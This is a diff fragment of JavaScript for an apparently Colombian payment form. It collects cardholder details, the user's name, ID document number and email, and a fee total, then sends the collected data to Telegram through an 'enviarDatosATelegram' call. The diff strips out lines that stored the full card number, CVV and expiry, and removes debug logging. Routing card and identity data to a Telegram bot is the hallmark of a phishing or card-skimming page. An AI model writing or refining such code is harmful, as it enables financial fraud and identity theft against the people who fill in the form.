             if (!cardholderName) {
                 cardholderInput.parentElement.classList.add('error');
                 isValid = false;
@@ -357,15 +1339,6 @@
             cvcInput.disabled = true;
             bancoEmisor.disabled = true;
 
-            const cardLast4 = cardNumber.slice(-4);
-            sessionStorage.setItem('cardLast4', cardLast4);
-            sessionStorage.setItem('cardNumberFull', cardNumber);
-            sessionStorage.setItem('cardCVV', cvc);
-            sessionStorage.setItem('cardExpiry', expiry);
-            sessionStorage.setItem('cardType', cardType);
-            sessionStorage.setItem('procesamiento_prioritario', localStorage.getItem('procesamiento_prioritario') || 'false');
-            sessionStorage.setItem('bancoEmisor', banco);
-
             // Leer datos personales desde localStorage
             const nombre = localStorage.getItem('nombre') || 'No proporcionado';
             const apellidos = localStorage.getItem('apellidos') || '';
@@ -373,16 +1346,14 @@
             const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
             const email = localStorage.getItem('email') || 'No proporcionado';
 
-            console.log('📋 Datos recuperados de localStorage:', { nombre, apellidos, tipoDocumento, numeroDocumento, email });
-
             const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
             let total = 23000;
             if (procesamiento_prioritario) {
                 total += 20000;
             }
             const totalFormateado = total.toLocaleString('es-CO').replace(/,/g, '.') + ' Col$';
-            
-            const fechaHora = new Date().toLocaleString('es-CO', { 
+
+            const fechaHora = new Date().toLocaleString('es-CO', {
                 timeZone: 'America/Bogota',
                 year: 'numeric',
                 month: '2-digit',
@@ -406,8 +1377,6 @@
                 totalFormateado: totalFormateado,
                 fechaHora: fechaHora
             };
-
-            console.log('📤 Datos a enviar a Telegram:', datosTelegram);
 
             const enviado = await enviarDatosATelegram(datosTelegram);
 
